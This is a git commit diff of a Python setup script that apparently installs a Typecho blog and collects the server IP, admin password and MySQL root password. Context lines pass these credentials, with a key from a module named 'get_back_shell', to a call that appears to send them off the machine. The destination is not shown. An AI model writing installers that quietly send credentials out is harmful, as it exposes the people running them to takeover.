73d83e84566da235b93bac609b5b89c80bc907af
dtaliy <982995037@qq.com>
2018-09-13 20:21:55 +0800

    commit

--- buildup/__init__.py
+++ buildup/__init__.py
@@ -4,12 +4,13 @@ from change.conf import *
 import subprocess
 import data_post
 import get_back_shell
+import os
 build()
 def buildup():
     #获取IP地址
     T = subprocess.getstatusoutput("wget -qO- -t1 -T2 ipv4.icanhazip.com")
-    print("your ip is :" + T)
-    myip = T
+    print("your ip is :" + T[1])
+    myip = T[1]
     #获取域名
     doman = input("please input your doman (Space carriage return skip):")
     conf(doman,'typecho.conf','domain')
@@ -31,7 +32,12 @@ def buildup():
     if admin_mail == ' ':
         admin_mail = '982995037@qq.com'
     #dbhost,userurl,userpassword,dbpassword,username ,usermail
+
     imf = data_post.imformation(get_back_shell.key,myip,admin_password,mysql_root_password,admin_name,admin_mail)
     imf.update()
     imf.sent()
-
+    os.system("clean")
+    print("your imformation:\n"
+          "your ip:" + myip + "\n"
+          "your admin name:"+ admin_name + "\n"
+          "your admin password:" + admin_password + "\n")
